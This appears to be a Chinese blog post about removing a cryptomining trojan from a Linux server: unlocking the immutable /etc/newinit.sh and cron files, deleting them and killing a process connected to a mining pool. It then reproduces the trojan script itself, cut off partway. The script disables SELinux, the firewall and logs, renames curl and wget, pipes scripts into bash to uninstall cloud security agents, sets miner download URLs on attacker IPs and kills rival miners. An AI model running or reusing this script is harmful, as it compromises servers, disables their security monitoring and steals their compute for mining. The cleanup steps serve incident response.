<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf root</span><br><span class="line"></span><br><span class="line">输出：rm: cannot remove ‘root’: Permission denied</span><br></pre></td></tr></table></figure>
<p>2，执行<code>/etc/newinit.sh</code>查看文件内容，卧槽，瞬间脸就绿了！TMD，各种授权、各种删、各种查杀和安装，文件属性也改了一堆。</p>
<p>比如脚本直接把curl替换为cd1，wget替换为wd1等等恶心的操作，还有其他重要的信息被篡改，这TMD良心被狗吃了么？</p>
<p>恢复起来难度不小，是在太麻烦的情况下，那就干脆选择重装系统吧。</p>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;curl &#x2F;usr&#x2F;bin&#x2F;url</span><br><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;url &#x2F;usr&#x2F;bin&#x2F;cd1</span><br><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;wget &#x2F;usr&#x2F;bin&#x2F;get</span><br><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;get &#x2F;usr&#x2F;bin&#x2F;wd1</span><br></pre></td></tr></table></figure>
<p>执行命令删除文件，提示不能删除，应该也是被锁定了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf &#x2F;etc&#x2F;newinit.sh</span><br><span class="line"></span><br><span class="line">输出：rm: cannot remove ‘&#x2F;etc&#x2F;newinit.sh’: Operation not permitted</span><br></pre></td></tr></table></figure>
<p>使用<code>lsattr</code>命令查看文件属性，查看文件属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsattr &#x2F;etc&#x2F;newinit.sh</span><br><span class="line"></span><br><span class="line">输出：----ia-------e-- newinit.sh</span><br></pre></td></tr></table></figure>
<p>注：通过命令 <code>chattr</code> 可以设置文件/文件夹的隐藏属性，来保证文件/文件夹的安全，其中比较重要的参数为i和a，这两个属性只有root用户才可以设置或清除。</p>
<p>很好！移除文件属性，再次删除文件，搞定！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr -ia /etc/newinit.sh </span><br><span class="line">rm -rf /etc/newinit.sh</span><br></pre></td></tr></table></figure>
<p>刚才脚本里的lock_cron()函数锁定了定时任务的好几个目录，也提供了unlock_cron()函数用来清除属性，那正好，就拷贝这个函数里的命令，把它设置的都清除，省得麻烦。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr -R -ia /var/spool/cron</span><br><span class="line">chattr -ia /etc/crontab</span><br><span class="line">chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">chattr -R -ia /etc/cron.d</span><br><span class="line"></span><br><span class="line">chattr -ia /var/spool/cron/root</span><br><span class="line">rm -rf /var/spool/cron/root</span><br></pre></td></tr></table></figure>
<p>继续查看是否存在连接到未知外网的网络连线，将其查杀。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -anptl</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1063&#x2F;sshd           </span><br><span class="line">tcp        0      0 172.19.239.108:43542    139.99.102.73:14444     ESTABLISHED 458&#x2F;[crypto]        </span><br><span class="line">tcp        0     64 172.19.239.108:22       115.238.42.142:56001    ESTABLISHED 1104&#x2F;sshd: root@pts </span><br></pre></td></tr></table></figure>
<p>找到未知连线crypto，查杀！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -rf \[crypto\].sh</span><br><span class="line">rm -rf \[crypto\]</span><br><span class="line">rm -rf \[crypto\].<span class="built_in">log</span> </span><br><span class="line">rm -rf \[crypto\].pid </span><br></pre></td></tr></table></figure>
<p>最后，杀掉运行的进程即可，或者重启下服务器也行，其他被篡改的内容，自己看着办吧，虽然操作很多，对机器也没啥影响。</p>
<h4 id="脚本附件"><a href="#脚本附件" class="headerlink" title="脚本附件"></a>脚本附件</h4><p>最后，附上木马脚本的内容，请勿尝试运行！观摩下就好，也许哪天也用得上:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">setenforce 0 2&gt;dev/null</span><br><span class="line"><span class="built_in">echo</span> SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null</span><br><span class="line">sync &amp;&amp; <span class="built_in">echo</span> 3 &gt;/proc/sys/vm/drop_caches</span><br><span class="line">crondir=<span class="string">&#x27;/var/spool/cron/&#x27;</span><span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br><span class="line">cont=`cat <span class="variable">$&#123;crondir&#125;</span>`</span><br><span class="line">ssht=`cat /root/.ssh/authorized_keys`</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /etc/zzhs</span><br><span class="line">rtdir=<span class="string">&quot;/etc/zzhs&quot;</span></span><br><span class="line">bbdir=<span class="string">&quot;/usr/bin/curl&quot;</span></span><br><span class="line">bbdira=<span class="string">&quot;/usr/bin/cd1&quot;</span></span><br><span class="line">ccdir=<span class="string">&quot;/usr/bin/wget&quot;</span></span><br><span class="line">ccdira=<span class="string">&quot;/usr/bin/wd1&quot;</span></span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cd1</span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wd1</span><br><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br><span class="line">rm -rf /var/<span class="built_in">log</span>/syslog</span><br><span class="line">chattr -iua /tmp/</span><br><span class="line">chattr -iua /var/tmp/</span><br><span class="line">ufw <span class="built_in">disable</span></span><br><span class="line">iptables -F</span><br><span class="line"><span class="comment">#sudo sysctl kernel.nmi_watchdog=0</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;0&#x27;</span> &gt;/proc/sys/kernel/nmi_watchdog</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;kernel.nmi_watchdog=0&#x27;</span> &gt;&gt;/etc/sysctl.conf</span><br><span class="line">userdel akay</span><br><span class="line">userdel vfinder</span><br><span class="line">rm -rf /tmp/addres*</span><br><span class="line">rm -rf /tmp/walle*</span><br><span class="line">rm -rf /tmp/keys</span><br><span class="line"><span class="keyword">if</span> ps aux | grep -i <span class="string">&#x27;[a]liyun&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  pkill aliyun-service</span><br><span class="line">  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span><br><span class="line">  rm -rf /usr/<span class="built_in">local</span>/aegis*</span><br><span class="line">  systemctl stop aliyun.service</span><br><span class="line">  systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">  service bcm-agent stop</span><br><span class="line">  yum remove bcm-agent -y</span><br><span class="line">  apt-get remove bcm-agent -y</span><br><span class="line"><span class="keyword">elif</span> ps aux | grep -i <span class="string">&#x27;[y]unjing&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/YunJing/uninst.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">miner_url=<span class="string">&quot;http://106.15.74.113/b2f628/zzh&quot;</span></span><br><span class="line">miner_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/zzh&quot;</span></span><br><span class="line">miner_size=<span class="string">&quot;7600464&quot;</span></span><br><span class="line">sh_url=<span class="string">&quot;http://106.15.74.113/b2f628/newinit.sh&quot;</span></span><br><span class="line">sh_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/newinit.sh&quot;</span></span><br><span class="line">config_url=<span class="string">&quot;http://106.15.74.113/b2f628/config.json&quot;</span></span><br><span class="line">config_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/config.json&quot;</span></span><br><span class="line">config_size=<span class="string">&quot;2752&quot;</span></span><br><span class="line">chattr_size=<span class="string">&quot;8000&quot;</span></span><br><span class="line">rm -f /tmp/.null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 128 &gt; /proc/sys/vm/nr_hugepages</span><br><span class="line">sysctl -w vm.nr_hugepages=128</span><br><span class="line"></span><br><span class="line">kill_miner_proc()</span><br><span class="line">&#123;</span><br><span class="line">netstat -anp | grep 185.71.65.238 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep 140.82.52.87 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :23 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :143 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :2222 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3333 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3389 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :5555 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6666 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6665 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6667 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :7777 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :8444 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3347 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:3333&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:5555&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kworker -c\&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;log_&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;systemten&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;netns&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;voltuned&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;darwin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/dl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ddg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/pprt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ppol&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/65ccE*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/jmx*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/2Ne80*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;IOFoqIgyC0zmf2UR&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;45.76.122.92&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.38.191.178&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.15.56.161&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;86s.jpg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aGTSGJJp&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nMrfmnRa&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;PuNY5tm2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;I0r8Jyyt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AgdgACUD&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;uiZvwxG8&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;hahwNEdB&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;BtwXn5qH&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3XEzey2T&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;t2tKrCSZ&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;svc&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;HD7fcBgg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;zXcDajSs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3lmigMo&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AkMK4A2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AJ2AkKe&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;HiPxCJRS&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC030&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC031&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC032&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC033&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;C4iLM4L&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aziplcr72qjhzvin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | awk <span class="string">&#x27;&#123; if(substr($11,1,2)==&quot;./&quot; &amp;&amp; substr($12,1,2)==&quot;./&quot;) print $2 &#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/boot/vmlinuz&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;i4b503a52cc5&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;dgqtrcst23rtdi3ldqk322j2&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;2g0uv7npuhrlatd&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;nqscheduler&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;rkebbwgqpl4npmm&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot;]&quot;</span> | awk <span class="string">&#x27;$3&gt;10.0&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;2fhtu70teuhtoh78jc5s&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;0kwti6ut420t&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;44ct7udt0patws3agkdfqnjm&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v <span class="string">&quot;/&quot;</span> | grep -v <span class="string">&quot;-&quot;</span> | grep -v <span class="string">&quot;_&quot;</span> | awk <span class="string">&#x27;length($11)&gt;19&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;\[^&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;rsync&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;watchd0g&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | egrep <span class="string">&#x27;wnTKYg|2t3ik|qW3xT.2|ddg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;158.69.133.18:8220&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;/tmp/java&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;gitee.com&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/java&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;104.248.4.162&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;89.35.39.78&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/dev/shm/z3.sh&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kthrotlds&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;ksoftirqds&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;netdns&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;watchdogs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kdevtmpfsi&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kinsing&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;redis2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line"><span 